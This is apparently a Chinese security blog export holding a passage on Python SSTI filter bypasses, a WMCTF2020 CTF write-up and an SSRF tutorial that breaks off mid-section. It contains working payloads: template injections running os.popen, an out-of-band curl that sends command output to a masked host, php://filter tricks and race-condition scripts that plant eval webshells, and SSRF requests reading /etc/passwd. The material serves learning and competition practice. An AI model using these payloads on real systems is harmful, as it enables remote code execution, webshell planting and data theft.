<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">65</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

> 

<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h1><blockquote>


当我们需要测试SSTI过滤了什么的时候，可以使用如下payload防止其500:

`{{"要测试的字符"}}`，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。


</blockquote>
<h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h2>

回顾上面的payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

前面的引号是为了引出基类，可以被替换为数组、字典，以及数字。

后面的引号可以使用request.args来绕过此处的过滤。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[request.args.arg1][request.args.arg2](request.args.arg3).read()&#125;&#125;&amp;arg1=os&amp;arg2=popen&amp;arg3=whoami</span><br></pre></td></tr></table></figure>

另外的一种方法

通过python自带函数来绕过引号，这里使用的是chr()。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[§<span class="number">0</span>§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>

通过payload爆破subclasses，获取某个subclasses中含有chr的类索引，可以看到爆破出来很多了，这里随便选一个。

接着尝试使用chr尝试绕过后续所有的引号：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">100</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **过滤中括号**

回顾最初的payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

这里globals的中括号有点问题。

a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此来绕过：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">375</span>).__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **过滤关键字**

主要看关键字是如何过滤的，如果只是替换为空，可以尝试双写绕过，如果直接ban了，就可以使用字符串合并的方式进行绕过。

使用中括号的payload：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

不使用中括号的payload：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

这里主要使用了**getattribute**来获取字典中的value，参数为key值。

第二种绕过过滤关键字的办法之前也提到了，即使用request对象：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>

第三种绕过关键字过滤的办法即使用str原生函数：

我们可以使用decode、replace等来绕过所过滤的关键字。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.replace(<span class="string">&quot;W&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#YE=</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.decode(<span class="string">&quot;base64&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#aa</span></span><br></pre></td></tr></table></figure>

## **模块阉割**

在比赛环境中，经常会阉割掉一些内置函数，我们可以尝试使用reload来重载。

在Python2中，reload是内置函数，而在Python3中，reload则为imp module下的函数，使用方法：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> imp <span class="keyword">import</span> reload</span><br><span class="line">reload(a).popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>

我们一般是不能直接reload(os)的，因为可能当前类并没有import os。

所以一般都是`reload(__builtins__)`，这时可以重新载入**builtins**，此时**builtins**中被删除的比如eval、**import**等就又都回来了。

## **过滤{{}}**

相当于把命令执行的结果外带出去。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

## **过滤点号**

在Python环境中(Python2/Python3)，我们可以使用访问字典的方式来访问函数/类等。

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__等价于<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>

> ]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF2020</title>
    <url>/2020/08/06/WMCTF2020/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>不会做，好多知识盲点🙃</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以先学习P神的死亡exit的绕过：<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
<p>这里的话看到<code>file_put_contents()</code>一般就是写shell了，但是因为前面有<code>exit()</code>导致即使我们成功写入一句话，也执行不了，一般来说可以用base64可以直接绕过，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>先<code>strip_tags</code>去除死亡<code>exit</code>，再将<code>webshell</code>用<code>base64-decode</code>还原</p>
<p>又或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>原理和上面类似，核心是将”死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，</p>
<p>如果我们上传<code>&lt;?cuc cucvasb();?&gt;</code>，经过rot13编码后会变成<code>&lt;?php phpinfo();?&gt;</code>。</p>
<p>这就是P神的三种绕过exit的方法，但是题目过滤了<code>rot</code>，<code>base64</code>，以及<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>，前后两个地方都是content，所以这题的解法要改一下。</p>
<p>一般来说往文件里面写东西并绕过exit是这样的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>

<p>比如说写一个<code>.htaccess</code>(这里参考hhhm师傅博客)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>会得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>

<p>前置知识看好后，下面是官方的解法了。</p>
<h3 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a><strong>二次编码绕过</strong></h3><p><code>file_put_contents</code>中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过%25被ban了，测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码 </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>

<h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a><strong>过滤器绕过</strong></h3><p>题目中过滤的过滤器有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>

<p>预留了zlib、bzip2、string等过滤器， <code>php:filter</code> 支持使用多个过滤器，所以可以利用 <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> 来做，压缩后再解压后内容肯定不变，可以在中间遍历一下剩下的几个过滤器，看看中间操作时候是否会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>

<p>会生成这个</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php@…xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>

<h3 id="爆破临时文件"><a href="#爆破临时文件" class="headerlink" title="爆破临时文件"></a><strong>爆破临时文件</strong></h3><p>环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以老问题，利用string.strip_tags会发生段错误，这时候上传一个shell会以临时文件的形式保存在/tmp中，利用require_once包含getshell即可。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">​</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">​</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line">    file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line">    phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    <span class="keyword">print</span> phpinfo_url</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_tmp_files()</span><br></pre></td></tr></table></figure>

<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里因为<code>flag.php</code>被<code>require_once</code>包含过一次了，所以下面如果用伪协议去读的话，是读取不到flag.php的内容的。第一个版本存在非预期：session.upload_progress</p>
<p>具体可以参考：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>原理就是利用的是条件竞争，上传一个足够大的文件增加session文件的存在时间使得包含成功。</p>
<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>打开题目看到文件名”daolnwod.zip”，看到文件结尾的4B 50不难想到将文件reverse后就能得到压缩包和flag </p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>

<p>解压即可得到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>SSRF漏洞学习</title>
    <url>/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>总结的不是很全，以后慢慢更。</p>
<h1 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a><strong>ssrf是什么</strong></h1><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
<p>比如有个URL是这样的：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>这个URL原本是服务端发起请求获取链接地址的图片数据。</p>
<p>但是如果存在SSRF漏洞的话，我们就可以使用一些协议来读取和执行相关命令，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure>

<p>那么问题来了，如何判断是否存在SSRF漏洞呢？</p>
<p>通常来说会出现SSRF的地方比如上面说的URL地址加载或下载图片</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>还有就是图片、文章收藏功能</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/fhaljs</span><br></pre></td></tr></table></figure>

<p>以及通过URL分享，转码服务，在线翻译，未公开的api实现以及其他扩展调用URL的功能等等一些地方。我们也可以通过一些url中的关键字来识别，比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">share、wap、url、link、src、source、target、u、<span class="number">3</span>g、display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>

<h1 id="ssrf小试验"><a href="#ssrf小试验" class="headerlink" title="ssrf小试验"></a>ssrf小试验</h1><p>首先要知道可能出现SSRF的函数有：<code>file_get_contents()</code>、<code>curl()</code>、<code>fsocksopen()</code>、<code>fopen()</code>等，这里用<code>curl()</code>来举例子。</p>
<p>存在SSRF漏洞的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//创建一个新的curl资源</span></span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  <span class="comment">//设置URL和相应的选项</span></span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//抓取URL并把它传递给浏览器</span></span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  <span class="comment">//关闭curl资源，并且释放系统资源</span></span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>http协议</li>
</ul>
<p>探测内网主机存活</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=http://127.0.0.1:1314</span><br></pre></td></tr></table></figure>

<ul>
<li>通过file协议读取文件</li>
</ul>
<p>在有回显的情况下，利用 file 协议可以读取任意内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#win</span></span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/WINDOWS/win.ini</span><br><span class="line"><span class="comment">#liunx</span></span><br><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>dict协议</li>
</ul>
<p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure>

<p>查看redis的相关配置。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>

<p>查看ssh的banner信息</p>
<ul>
<li>gopher协议</li>
</ul>
<p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求，gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)，可用于反弹shell。</p>
<p>这里使用的是阿里云服务器，先开启一个监听</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=gopher://127.0.0.1:8102/_test</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br><span class="line">connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="keyword">from</span> localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">52450</span></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h1 id="ssrf怎么绕"><a href="#ssrf怎么绕" class="headerlink" title="ssrf怎么绕"></a><strong>ssrf怎么绕</strong></h1><p>这里总结了一些比较常用的绕过方法。</p>
<ul>
<li>data伪协议绕过</li>
</ul>
